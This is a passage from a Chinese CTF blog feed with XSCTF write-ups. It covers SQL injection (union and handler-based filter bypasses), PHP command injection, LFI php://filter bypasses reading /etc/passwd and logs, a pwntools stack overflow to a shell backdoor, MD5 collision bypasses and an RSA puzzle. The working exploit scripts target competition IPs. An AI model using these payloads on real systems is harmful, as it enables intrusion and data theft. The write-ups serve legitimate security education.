class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>),<span class="keyword">group_concat</span>(<span class="keyword">name</span>),<span class="keyword">group_concat</span>(<span class="keyword">class</span>),<span class="keyword">group_concat</span>(hobbies) <span class="keyword">from</span> class2<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class3#</span></span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Saofe1a_r3a11y_l0ve_xiaomei&#125;</code></p><h2 id="saveSaofe1a-partB"><a href="#saveSaofe1a-partB" class="headerlink" title="saveSaofe1a_partB"></a>saveSaofe1a_partB</h2><p>同样是sql注入<br>经过测试：<br><code>让我想想除了insert、where、delete、select、drop、update和.你们大黑阔还有什么招</code><br><code>嘻嘻，想起来了，set、prepare、execute也不行哦</code></p><p>用handler可以查</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">read</span> <span class="keyword">first</span>;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>如果不在第一条，但是题目又过滤了where关键字，可以使用limit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">read</span> <span class="keyword">first</span> <span class="keyword">limit</span> <span class="number">30</span>,<span class="number">1</span>;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Saofe1a_wAnt_a_9ir1fri3nd&#125;</code></p><h2 id="燕子不要走"><a href="#燕子不要走" class="headerlink" title="燕子不要走~"></a>燕子不要走~</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//燕子，燕子，没有你我怎么活啊，不要甩开我啊  </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params">$cmd</span>)</span>&#123;    system($cmd.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]) ? hello_shell($_GET[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接用分号隔开即可<br><code>?cmd=cat /flag;</code></p><p><code>XSCTF&#123;Yanz1_i_w1sh_y0u_hApp1neSs&#125;</code></p><h2 id="gift-RSA"><a href="#gift-RSA" class="headerlink" title="gift_RSA"></a>gift_RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">gift = <span class="built_in">pow</span>(m, d, n)</span><br><span class="line">print(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">print(<span class="string">f&#x27;gift = <span class="subst">&#123;gift&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117</span></span><br><span class="line"><span class="string">gift = 44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据公钥加密算法的特性，公私钥互换效果是一样的，这里用私钥加密（签名），就可以使用公钥解密（验证）</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308</span></span><br><span class="line">n = <span class="number">130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117</span></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c, e, n)))</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;H3re_i5_@_Gif7_f0r_y0u_From_Euler:)))))!&#125;</code></p><h2 id="你说你是凯撒大帝尊嘟假嘟啊"><a href="#你说你是凯撒大帝尊嘟假嘟啊" class="headerlink" title="你说你是凯撒大帝尊嘟假嘟啊"></a>你说你是凯撒大帝尊嘟假嘟啊</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Öv0 0vo O.0 O_Ö Övo 0vo ov0 ovÖ o.Ö owÖ 0.o OwÖ o.O Ö.O O_0 o_Ö Ö_0 OwÖ Ov0 0wÖ Ö.Ö owO 0v0 o.O o.Ö Ö.0 o.0 ovO o.Ö Ö.o 0vo Ow0 Ö.Ö owo 0_0 0.0 o.Ö Ö.O O.0 O_0 o_O 0vÖ owo </span><br></pre></td></tr></table></figure><p><a href="https://zdjd.vercel.app/">尊嘟假嘟O.o (zdjd.vercel.app)</a></p><p>解密之后凯撒爆破</p><p><code>XSCTF&#123;gr3at_y0u_aRe_reA1_CaesAr&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF_warmup</title>
      <link href="2024/11/04/xsctf_warmup/"/>
      <url>2024/11/04/xsctf_warmup/</url>
      
        <content type="html"><![CDATA[<h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>附件：babystack</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  init_func(argc, argv, envp);</span><br><span class="line">  start_show();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  __isoc99_scanf(v4);</span><br><span class="line">  vuln(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">vuln</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0x7FFFFFFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402038);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_40205D);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x8848</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>对于第一个比较，直接输入-1</li><li>对于read函数，输入80+8个字符之后再输入需要返回的地址（backdoor）即可</li></ul><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">sysaddr = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">print(<span class="string">&#x27;0x%x&#x27;</span>%sysaddr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(sysaddr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>正常来说这么写没问题，但是运行的时候不会返回shell<br>原因估计是堆栈平衡之类的问题，解决的方法是直接返回到调用system函数的地址，跳过栈操作<br><img src="https://s2.loli.net/2024/11/05/IOUJnwELYt7TCu5.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/IOUJnwELYt7TCu5.png" srcset="data:image/png;base64,666" alt="image"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">80</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x4012bf</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>坑</strong></p><ul><li>当返回到后门函数行不通的时候，返回到调用system函数的语句</li><li>Windows和Linux平台运行同一份exp的结果可能不同</li></ul><p><code>XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125;</code></p><h2 id="Badbad-filename"><a href="#Badbad-filename" class="headerlink" title="Badbad_filename"></a>Badbad_filename</h2><p><code>GET me a filename and I&#39;ll include it!</code><br>测试一下发现过滤了php、filter、base、data、file等关键字<br>然后就搜一堆绕过的方法</p><ul><li>如果base被绕过了，可以使用url编码convert往后，resource往前的字符<code>?filename=pHp://filtEr/convert.%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565/resource=</code></li><li>除了测试文件<code>/etc/passwd</code>之外，如果是nginx，可以考虑读日志<code>/var/log/nginx/access.log</code></li><li>如果读<code>flag.php</code>，记得先访问一下看看页面是否存在</li></ul><p>最后，这道题的解法是最简单的双写绕过<br><code>?filename=pphphp://filfilterter/convert.basbasee64-encode/resource=flag.pphphp</code></p><p><code>XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125;</code></p><p>麻了</p><h2 id="canyoupassit"><a href="#canyoupassit" class="headerlink" title="canyoupassit"></a>canyoupassit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a1&#x27;</span>] != $_POST[<span class="string">&#x27;b1&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a1&#x27;</span>] == md5($_POST[<span class="string">&#x27;b1&#x27;</span>])))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;恭喜你过了第一关!&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;就这?&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;key&#x27;</span>] == md5($_POST[<span class="string">&#x27;key&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;恭喜你过了第二关!&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;再看看?&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">$now = time();  </span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a2&#x27;</span>] != $_POST[<span class="string">&#x27;b2&#x27;</span>] &amp;&amp; str_starts_with($_POST[<span class="string">&#x27;a2&#x27;</span>], $now) &amp;&amp; str_starts_with($_POST[<span class="string">&#x27;b2&#x27;</span>], $now) &amp;&amp; md5($_POST[<span class="string">&#x27;a2&#x27;</span>] === md5($_POST[<span class="string">&#x27;b2&#x27;</span>])))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;恭喜你过了第三关!&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;/flag&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;真可惜，就差最后一步了&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一道有关md5绕过的题目，主要分为三个部分</p><ol><li>不同值的变量，md5的值是一样的（弱比较） – md5弱碰撞</li><li>md5值等于自身的值（<strong>弱比较</strong>） – 0e绕过</li><li>不同值的md5是一样的（<strong>强比较</strong>），且要求两个值都有特定前缀</li></ol><p>解决的方法如下：</p><ol><li>对于弱比较的md5值，可以直接百度特定的值<ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a<br>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</li></ul></li><li>对于若比较的<code>$a == md5($a)</code>，存在0e开头的值md5之后还是0e开头，这样在弱比较中仍然相等，如<code>0e215962017</code></li><li>对于强比较，可以采用md5强碰撞的方式，网上有特定的值可以满足值不同但是md5值相同，但是这里存在另外一个问题，就是这两个值的前缀必须是当前时间，这就需要自己生成特定的两个值，使用<code>fastcoll</code>工具，可以生成特定前缀的值来满足条件，这个特定前缀就是当前时间</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">int</span>(time.time()+<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;t.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(t))</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;fastcoll_v1.0.0.5.exe t.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">a2 = <span class="built_in">open</span>(<span class="string">&#x27;t_msg1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">b2 = <span class="built_in">open</span>(<span class="string">&#x27;t_msg2.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.213:30038/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a1&#x27;</span>: <span class="string">&#x27;s214587387a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b1&#x27;</span>: <span class="string">&#x27;s155964671a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span> : <span class="string">&#x27;0e215962017&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a2&#x27;</span>: a2,</span><br><span class="line">    <span class="string">&#x27;b2&#x27;</span>: b2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>一些要注意的点</p><ul><li>特定前缀的时间最好往后调一调，避免因网络问题导致错过时间</li><li>生成的两个txt需要以二进制的形式读取</li></ul><p><code>flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125;</code></p><h2 id="Ezgame"><a href="#Ezgame" class="headerlink" title="Ezgame"></a>Ezgame</h2><p>进入是一个小游戏，要求达到非常高的分数</p><p><img src="https://s2.loli.net/2024/11/05/wSjykCZa9XJ7edM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/wSjykCZa9XJ7edM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026193535.png"></p><p>直接玩肯定不现实，于是翻翻js代码<br>因为不是通过php记录分数的，所以不可以使用POST请求之类的修改分数</p><p>入手的思路是通过浏览器控制台访问所有的对象，然后找到存储分数的变量，直接在控制台修改变量<br>翻了十几份代码之后去控制台查看对象，从全局对象入手，最终找到了这些<br><img src="https://s2.loli.net/2024/11/05/FMiTn2lvewczJ83.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/FMiTn2lvewczJ83.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194009.png"></p><p><img src="https://s2.loli.net/2024/11/05/AzUIKpGtRdwu5gM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/AzUIKpGtRdwu5gM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194244.png"><br>看起来像是存储游戏角色的变量<br>于是直接修改其中的gold和kills以及high_score（不知道改哪个，干脆全改了)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;o1&quot;</span>,<span class="attr">&quot;ownerId&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;position&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">359.04999999999956</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">154.2499999999999</span>&#125;,<span class="attr">&quot;size&quot;</span>:&#123;<span class="attr">&quot;width&quot;</span>:<span class="number">32</span>,<span class="attr">&quot;height&quot;</span>:<span class="number">32</span>&#125;,<span class="attr">&quot;direction&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">0</span>&#125;,<span class="attr">&quot;facing&quot;</span>:&#123;<span class="attr">&quot;x&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;y&quot;</span>:<span class="number">0</span>&#125;,<span class="attr">&quot;speed&quot;</span>:<span class="number">150</span>,<span class="attr">&quot;team&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;hitPoints&quot;</span>:<span class="number">100</span>,<span class="attr">&quot;damage&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spriteSheet&quot;</span>:<span class="string">&quot;characters&quot;</span>,<span class="attr">&quot;spriteX&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spriteY&quot;</span>:<span class="number">992</span>,<span class="attr">&quot;spriteAlign&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;animated&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;animFrameIndex&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;animNumFrames&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;animDelay&quot;</span>:<span class="number">200</span>,<span class="attr">&quot;animElapsed&quot;</span>:<span class="number">16</span>,<span class="attr">&quot;spawnFrameIndex&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spawnFrameCount&quot;</span>:<span class="number">2</span>,<span class="attr">&quot;spawnFramesX&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;spawnFramesY&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;angle&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;rotateSpeed&quot;</span>:<span class="number">400</span>,<span class="attr">&quot;rotate&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;worth&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;ttl&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;ttlElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;alpha&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;alphaMod&quot;</span>:<span class="number">-1</span>,<span class="attr">&quot;gibletSize&quot;</span>:<span class="string">&quot;small&quot;</span>,<span class="attr">&quot;cooldown&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;cooldownElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;autoFire&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;soundAttacks&quot;</span>:<span class="string">&quot;hero_attacks&quot;</span>,<span class="attr">&quot;soundDamage&quot;</span>:<span class="string">&quot;hero_damage&quot;</span>,<span class="attr">&quot;soundDies&quot;</span>:<span class="string">&quot;hero_dies&quot;</span>,<span class="attr">&quot;alive&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;states&quot;</span>:[&#123;<span class="attr">&quot;type&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;timer&quot;</span>:&#123;<span class="attr">&quot;elapsed_ms&quot;</span>:<span class="number">43298</span>,<span class="attr">&quot;ttl&quot;</span>:<span class="number">0</span>&#125;&#125;,<span class="literal">null</span>,<span class="literal">null</span>],<span class="attr">&quot;currentWeaponIndex&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;collidable&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;bounce&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;piercing&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;achievementId&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;deathsForAchievement&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;ignoreLogDeath&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;damageType&quot;</span>:<span class="literal">null</span>,<span class="attr">&quot;drawIndex&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;moveChangeElapsed&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;moveChangeDelay&quot;</span>:<span class="number">500</span>,<span class="attr">&quot;wounds&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;weapons&quot;</span>:[&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;h_sword&quot;</span>,<span class="attr">&quot;count&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;h_spear&quot;</span>,<span class="attr">&quot;count&quot;</span>:<span class="number">82</span>&#125;],<span class="attr">&quot;gold&quot;</span>:<span class="number">1000000000</span>,<span class="attr">&quot;kills&quot;</span>:<span class="number">10000000000</span>,<span class="attr">&quot;timesWounded&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;totalDamageTaken&quot;</span>:<span class="number">15</span>,<span class="attr">&quot;shotsFired&quot;</span>:<span class="number">108</span>,<span class="attr">&quot;shotsLanded&quot;</span>:<span class="number">65</span>,<span class="attr">&quot;shotsPerWeapon&quot;</span>:&#123;<span class="attr">&quot;h_sword&quot;</span>:<span class="number">28</span>,<span class="attr">&quot;h_knife&quot;</span>:<span class="number">31</span>,<span class="attr">&quot;h_spear&quot;</span>:<span class="number">18</span>&#125;,<span class="attr">&quot;meatEaten&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;cheater&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;phase&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;phaseInit&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;lootTable&quot;</span>:[],<span class="attr">&quot;killSwitch&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;hero&quot;</span>,<span class="attr">&quot;role&quot;</span>:<span class="string">&quot;hero&quot;</span>,<span class="attr">&quot;isMeatboy&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;bloodTimer&quot;</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure><p>然后返回游戏发现数据没有变化<br>以为错了，退出去，然后在主界面发现了flag<br><img src="https://s2.loli.net/2024/11/05/3pGuqBM7yFb2JwI.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/3pGuqBM7yFb2JwI.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026194359.png"></p><p><code>flag&#123;basju_D0G006706_iajdisaia&#125;</code></p><h2 id="hardphp"><a href="#hardphp" class="headerlink" 